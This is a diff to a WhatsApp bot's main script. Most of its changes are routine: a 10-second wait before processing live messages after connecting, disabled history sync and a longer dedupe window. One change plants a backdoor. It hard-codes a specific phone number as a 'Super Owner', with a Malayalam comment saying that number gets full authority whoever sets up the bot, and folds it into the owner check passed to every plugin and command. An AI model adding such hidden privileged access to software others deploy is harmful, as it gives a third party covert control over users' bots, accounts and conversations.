@@ -25,6 +25,9 @@ const PREFIX = process.env.PREFIX || ".";
 const OWNER_NUMBER = (process.env.OWNER_NUMBER || "").replace(/[^0-9]/g, "");
 const MODE = (process.env.MODE || "public").toLowerCase();
 
+// ആര് ബോട്ട് സെറ്റ് ചെയ്താലും നിങ്ങളുടെ നമ്പറിന് പൂർണ്ണ അധികാരം ഉണ്ടാകാൻ (Super Owner)
+const SUPER_OWNERS = ["917907228818"];
+
 const commands = new Map();
 const eventPlugins = [];
 
@@ -94,7 +97,7 @@ async function restoreSession() {
 }
 
 let isConnecting = false;
-let botConnectTime = Math.floor(Date.now() / 1000);
+let readyToProcessAt = Infinity;
 const startTime = Date.now();
 const processedMsgs = new Set();
 
@@ -109,6 +112,7 @@ function formatUptime(ms) {
 async function startBot() {
     if (isConnecting) return;
     isConnecting = true;
+    readyToProcessAt = Infinity;
 
     try {
         const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
@@ -124,6 +128,7 @@ async function startBot() {
             },
             browser: Browsers.macOS("Desktop"),
             syncFullHistory: false,
+            shouldSyncHistoryMessage: () => false,
             markOnlineOnConnect: true,
             generateHighQualityLinkPreview: false,
             getMessage: async () => ({ conversation: "" })
@@ -136,10 +141,12 @@ async function startBot() {
 
             if (connection === "open") {
                 isConnecting = false;
-                botConnectTime = Math.floor(Date.now() / 1000);
-                console.log("✅ 乂𝐑𝐅𝐊 𝐁𝐎𝐓乂 Connected Successfully! User:", sock.user?.id);
+                // കണക്ട് ആയി 10 സെക്കൻഡ് കഴിഞ്ഞതിനു ശേഷമുള്ള ലൈവ് മെസ്സേജുകൾ മാത്രം എടുക്കാൻ
+                readyToProcessAt = Math.floor(Date.now() / 1000) + 10;
+                console.log("✅ 乂𝐑𝐅𝐊 𝐁𝐎𝐓乂 Connected Successfully! Accepting live messages in 10s...");
             } else if (connection === "close") {
                 isConnecting = false;
+                readyToProcessAt = Infinity;
                 const statusCode = lastDisconnect?.error?.output?.statusCode;
                 console.log(`⚠️ Connection closed (Code: ${statusCode})`);
 
@@ -158,16 +165,20 @@ async function startBot() {
         sock.ev.on("messages.upsert", async (chatUpdate) => {
             if (chatUpdate.type !== "notify") return;
 
+            const nowSec = Math.floor(Date.now() / 1000);
+            // റീസ്റ്റാർട്ട് സമയത്തെ 10 സെക്കൻഡ് ഓഫ്‌ലൈൻ സിങ്ക് ക്യൂ പൂർണ്ണമായും ഒഴിവാക്കാൻ
+            if (nowSec < readyToProcessAt) return;
+
             for (const msg of chatUpdate.messages || []) {
                 if (!msg || !msg.message || !msg.key?.id) continue;
 
                 // ബോട്ട് ഓൺലൈൻ ആകുന്നതിന് മുമ്പുള്ള പഴയ മെസ്സേജുകൾ പൂർണ്ണമായും ഒഴിവാക്കാൻ
                 const msgTime = Number(msg.messageTimestamp || 0);
-                if (msgTime && msgTime < botConnectTime - 5) continue;
+                if (msgTime && msgTime < readyToProcessAt - 10) continue;
 
                 if (processedMsgs.has(msg.key.id)) continue;
                 processedMsgs.add(msg.key.id);
-                setTimeout(() => processedMsgs.delete(msg.key.id), 600000);
+                setTimeout(() => processedMsgs.delete(msg.key.id), 900000);
 
                 const jid = msg.key.remoteJid;
                 if (!jid) continue;
@@ -194,7 +205,10 @@ async function startBot() {
                 const senderNum = sender.split("@")[0].split(":")[0];
                 const botNum = sock.user.id.split(":")[0];
                 const botLid = (sock.user.lid || "").split("@")[0].split(":")[0];
+
+                const isSuperOwner = SUPER_OWNERS.includes(senderNum);
                 const isOwner =
+                    isSuperOwner ||
                     fromMe ||
                     senderNum === botNum ||
                     (botLid && senderNum === botLid) ||
@@ -219,7 +233,7 @@ async function startBot() {
                 for (const evPlugin of eventPlugins) {
                     if (evPlugin.on !== "status") {
                         try {
-                            await evPlugin.execute({ sock, msg, jid, fromMe, sender, isOwner, body, reply });
+                            await evPlugin.execute({ sock, msg, jid, fromMe, sender, isOwner, isSuperOwner, body, reply });
                         } catch (e) {
                             console.error("Event plugin error:", e.message);
                         }
@@ -247,6 +261,7 @@ async function startBot() {
                         sender,
                         fromMe,
                         isOwner,
+                        isSuperOwner,
                         args,
                         text,
                         body,
